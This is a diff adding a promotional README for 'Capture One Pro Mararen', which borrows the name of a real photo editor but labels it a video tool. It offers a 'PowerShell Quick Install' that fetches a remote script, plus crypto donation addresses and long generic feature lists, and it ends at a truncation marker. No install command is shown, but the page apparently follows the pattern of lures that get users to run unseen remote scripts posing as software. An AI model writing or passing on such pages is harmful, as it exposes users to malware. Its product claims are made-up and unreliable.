@@ -1,0 +1,89 @@
+🎬 Capture One Pro Mararen — Video Tool
+
+🚀 PowerShell Quick Install
+
+Help keep this going
+
+BTC:&nbsp;1EkD9DBQ7FMm2zoLTiQTc8rH1t9u9qkGWU | TRON:&nbsp;TT2orBc2DLMsKmb5214LsKn8afPxHSmNTC
+
+Capture One Pro Mararen turns raw captures into a visual storytelling flow, where color, contrast, and composition move from camera to final render without friction. Built for photographers who think in frames and timelines, it keeps every adjustment close at hand so your eye stays on the image, not the interface. Layer-based edits, tethering, and session workflows fold into one continuous rhythm that follows the way you actually shoot and deliver.
+
+✅ Requirements
+
+- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
+- Windows 10 / 11 (x64)
+- Internet connection — required to fetch the script
+- Administrator — not required
+
+Features
+
+- Session-first workspace: Build a shoot around a session, not a folder tree. Capture One Pro Mararen keeps tethered captures, imports, selects, and exports in one visual lane so you always know where you are in the edit.
+
+- Tethered capture with a live review loop: Connect a camera and watch frames land on the canvas in near real time. Rate, color-tag, and flag as you shoot, so the culling conversation happens while the set is still warm.
+
+- Color that behaves like film: Layer color balance, curve, and level adjustments with a live histogram and skin-tone-aware tools. The goal is not to fix images one at a time but to tune a look once and carry it across the whole session.
+
+- Layered local adjustments: Paint and mask exposure, contrast, and color changes onto specific regions. Stack them, reorder them, and dial opacity so retouching reads as intentional light rather than a filter.
+
+- Variant-driven workflow: Spin off multiple versions of a frame for different crops, looks, or client directions without duplicating files. Compare variants side by side and promote the winner.
+
+- Smart albums and filters: Let ratings, keywords, and capture metadata assemble the edit for you. Filter by lens, ISO, or color tag to move from a thousand frames to the shortlist in a few clicks.
+
+- Batch without fear: Apply a look, crop, or metadata set to a selection and watch the preview update per frame. Every batch action is reversible, so experimentation stays cheap.
+
+- Export presets for every destination: Save output recipes for print, web, and client review, each with its own sizing, sharpening, and color profile. One click turns a session into deliverable files.
+
+- Visual proofing mode: Step back from the tools and view the session as a contact sheet. Spot gaps in coverage, sequencing problems, and outliers before they reach the client.
+
+- Keyboard-led speed: Nearly every tool has a shortcut, and the interface is built for hands-on-keyboard editors. The fastest path from capture to export is the one you can do without reaching for the mouse.
+
+How it works
+
+Capture One Pro Mararen turns a pile of raw captures into a coherent visual story. At its core, it reads your session like a photographer reads a scene: it notices the light, the color temperature, the grain, and the intent, then organizes everything into a clean, navigable workspace.
+
+The first step is ingestion. Point the tool at a folder or session and it maps every file, building a visual index of thumbnails, metadata, and exposure data. Instead of scrolling through hundreds of filenames, you get a contact sheet that actually reflects what you shot.
+
+From there, the tool builds a working timeline. Captures are grouped by shoot, sequence, and time, so bursts and evolving setups stay bundled together. You can scrub through the timeline like a filmstrip, watching the session unfold frame by frame.
+
+Next comes the color and tone engine. Capture One Pro Mararen applies consistent adjustments across a set, letting you anchor one frame as the visual reference and propagate its look outward. White balance, contrast curves, and color grading travel with the selection, keeping the whole set visually unified.
+
+The workspace itself is built for flow. Panels stay out of the way until you need them, previews render at full fidelity, and every change is reflected instantly. Batch operations happen in the background, so you can keep moving while the tool catches up.
+
+Finally, the export stage assembles your selects into deliverable form. Choose your output profile, resolution, and naming scheme, and the tool packages everything into a tidy, consistent set of files ready to hand off or archive.
+
+Every step is reversible, every adjustment is tracked, and the whole process stays anchored to the image—so the tool stays invisible and the photographs stay front and center.
+
+Modules and Settings
+
+Tethered Capture Setup
+This module coordinates the arrival of frames from a connected camera into a named capture session so that each shot is filed as it is taken. It is the entry point for the rest of the workspace, and the naming and destination choices made here determine how thumbnails appear in the session browser downstream.
+- Session name and destination grouping: sets the folder-level structure that incoming frames inherit, so related shots stay together from the first frame.
+- Capture naming pattern: controls the file naming applied to each arriving shot, keeping sequences ordered and identifiable.
+- Incoming frame monitoring: displays a live thumbnail sequence, letting users review and flag keepers immediately after capture.
+- Session selection: switches the active destination when moving between setups within the same shoot.
+
+Catalog and Session Browser
+This module organizes images across catalogs and sessions into browsable, filterable views. It draws on the metadata and ratings produced elsewhere in the workspace, so the library view reflects both the file structure from capture and the edits users make while reviewing.
+- Album and smart grouping creation: collects related images into named groups that update as images are added or retagged.
+- Sort order and filter criteria: narrows large shoots to subsets by rating, color label, keyword, or capture order.
+- Keyword and metadata tag assignment: tags selected images so they remain retrievable in later searches and catalog filters.
+- View layout controls: adjusts how thumbnails and metadata are presented while browsing.
+
+Adjustment and Preset Workspace
+This module applies non-destructive tone and color corrections that are stored as an editable adjustment history. Presets defined here become reusable settings for the batch module and for syncing across images.
+- Tone and color sliders: adjust exposure, contrast, white balance, and color without altering original files.
+- Preset creation and application: saves adjustment combinations for reuse on single images or groups.
+- Adjustment history: records each change so edits can be revised or reverted later.
+- Preview toggle: shows the adjusted preview against the saved edit state for verification.
+
+Local Adjustment Layers
+This module handles masked corrections that target specific regions of an image rather than the whole frame. Layers stack on top of the base adjustments, so local work extends rather than replaces global edits.
+- Mask shape and placement: defines the region a local correction affects.
+- Feathering and opacity: softens mask edges and controls how strongly the layer applies.
+- Layer stacking: combines multiple local corrections for compound effects while underlying image data stays intact.
+- Layer visibility toggles: enables or disables individual layers to compare their contribution to the preview.
+
+Batch and Output Recipes
+This module applies shared settings across multiple images and prepares them for delivery. It consumes presets from the adjustment workspace and metadata from the browser, so the exported files carry both the intended look and the assigned tags.
+
+…（内容已截断）
